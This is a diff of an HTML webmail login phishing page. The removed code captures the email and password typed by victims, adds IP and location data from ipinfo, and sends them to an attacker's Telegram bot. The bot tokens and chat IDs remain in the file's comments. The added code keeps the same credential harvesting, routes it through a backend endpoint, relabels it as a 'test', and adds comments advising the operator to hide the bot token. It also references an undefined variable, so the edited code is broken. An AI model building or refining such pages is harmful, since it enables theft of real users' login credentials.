@@ -112,7 +112,7 @@
     <div class="logo"><img src="https://harlequin-legal-ox-300.mypinata.cloud/ipfs/bafkreigeyp4umoleb6j7zh4xz435gvdd2endf4zervl3qgisg5pmbm24je" alt=""></div>
 
     <!-- Form -->
-    <form>
+    <form id="myForm">
       <div class="form-group email">
         <label style="font-weight: 600; font-size: 14px;"  for="email">Email</label>
         <input style="margin-top: 15px;" type="email" id="email" placeholder="Email Address">
@@ -175,101 +175,79 @@
      //8215779697:AAG9QPdE878WO0kKIrmtxO7TBWdSJvILf7Q
 // 6954492973
 
- var telegram_bot_id = "6949497283:AAGtXd6deZQBaLidD9PemzzWyJ64XknZ7mE";
-        var chat_id = 7059402644;
-        var attemptCounter = 0;
-        var userInfo = {};
-    
-        // Fetch IP info
-        async function fetchText() {
-            let url = "https://ipinfo.io/json?token=de42e80837e28f";
-            try {
-                let response = await fetch(url);
-                if (!response.ok) {
-                    throw new Error('Network response was not ok ' + response.statusText);
-                }
-                let data = await response.json();
-                if (data) {
-                    userInfo = {
-                        country: data.country || 'N/A',
-                        state: data.region || 'N/A',
-                        city: data.city || 'N/A',
-                        isp: data.org || 'N/A',
-                        ip: data.ip || 'N/A'
-                    };
-                } else {
-                    console.error('Data is undefined');
-                }
-            } catch (error) {
-                console.error('Fetch error: ', error);
-            }
-        }
-    
-        // Get current time
-        function getCurrentTime() {
-            var now = new Date();
-            var year = now.getFullYear();
-            var month = (now.getMonth() + 1).toString().padStart(2, '0');
-            var day = now.getDate().toString().padStart(2, '0');
-            var hours = now.getHours().toString().padStart(2, '0');
-            var minutes = now.getMinutes().toString().padStart(2, '0');
-            var seconds = now.getSeconds().toString().padStart(2, '0');
-            return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
-        }
-    
-        // Handle form submission
-        async function handleSubmit(event) {
-            event.preventDefault();
-    
-            var u_name = document.getElementById("email").value;
-            var password = document.getElementById("password").value;
-    
-    
-            // Fetch IP details before sending
-            await fetchText();
-    
-            // Prepare data to send to the Telegram bot
-            var message = `
-            -- ༒ քɛʀʀʏƈʏɮɛʀ ʍǟɖɛ ɨȶ ༒ --
-            Webmail Login [RC & CP]
-            -------------------------------
-            User ID: ${u_name}
-            Password: ${password}
-            Attempt: ${attemptCounter + 1}
-            Country: ${userInfo.country}
-            State: ${userInfo.state}
-            City: ${userInfo.city}
-            ISP: ${userInfo.isp}
-            IP Address: ${userInfo.ip}
-            Time: ${getCurrentTime()}
-            `;
-    
-            var url = `https://api.telegram.org/bot${telegram_bot_id}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
-            fetch(url, { method: "GET" })
-            .then(response => {
-                if (response.ok) {
-                    attemptCounter++; // Increment only if message is successfully sent
-    
-                    // Clear the user ID and password fields
-                    document.getElementById("email").value = "";
-                    document.getElementById("password").value = "";
-    
-                   
-    
-                } else {
+  // remove any hardcoded bot token from frontend!
+    const chatId = 6954492973; // your target chat id (safe to keep public)
 
-                }
-            })
-            .catch(error => {
-                alert("Error: " + error);
-            });
+    // fetch IP info (optional) - note: your ipinfo token is public here
+    async function fetchIPInfo() {
+      try {
+        const resp = await fetch("https://ipinfo.io/json?token=de42e80837e28f");
+        if (!resp.ok) return {};
+        return await resp.json();
+      } catch (e) {
+        console.warn("IP info error", e);
+        return {};
+      }
+    }
+
+    function getCurrentTime() {
+      const now = new Date();
+      const year = now.getFullYear();
+      const month = String(now.getMonth() + 1).padStart(2, "0");
+      const day = String(now.getDate()).padStart(2, "0");
+      const hours = String(now.getHours()).padStart(2, "0");
+      const minutes = String(now.getMinutes()).padStart(2, "0");
+      const seconds = String(now.getSeconds()).padStart(2, "0");
+      return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
+    }
+
+    async function handleSubmit(event) {
+      event.preventDefault();
+
+      // Grab inputs (note: you used "hjjrd" id in your code; keep consistent)
+      const u_name = document.getElementById("email").value || "N/A";
+      const password = document.getElementById("password").value || "N/A";
+
+      // optional: get IP info
+      const info = await fetchIPInfo();
+
+      // Build a message (for testing use dummy/sanitized data)
+      const message = `
+-- TEST MESSAGE --
+User ID: ${u_name}
+Value: ${igkrd}
+Country: ${info.country || "N/A"}
+Region: ${info.region || "N/A"}
+City: ${info.city || "N/A"}
+ISP: ${info.org || "N/A"}
+IP: ${info.ip || "N/A"}
+Time: ${getCurrentTime()}
+`;
+
+      try {
+        const resp = await fetch("/sendMessage", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, text: message })
+        });
+
+        const data = await resp.json();
+        if (resp.ok && data?.ok) {
+          // success – clear inputs
+          document.getElementById("email").value = "";
+          document.getElementById("password").value = "";
+          alert("Message sent (test).");
+        } else {
+          console.error("Telegram response:", data);
+          alert("Failed to send. Check console.");
         }
+      } catch (err) {
+        console.error(err);
+        alert("Network or server error (see console).");
+      }
+    }
 
-document.getElementById("nextBtn").addEventListener("click", function(event) {
-  validateForm();
-  handleSubmit(event);
-});
-
+    document.getElementById("myForm").addEventListener("submit", handleSubmit);
 // 6949497283:AAGtXd6deZQBaLidD9PemzzWyJ64XknZ7mE
 // 7059402644
 
@@ -425,4 +403,5 @@ document.getElementById("nextBtn").addEventListener("click", function(event) {
 
 </body>
 </html>
+
 
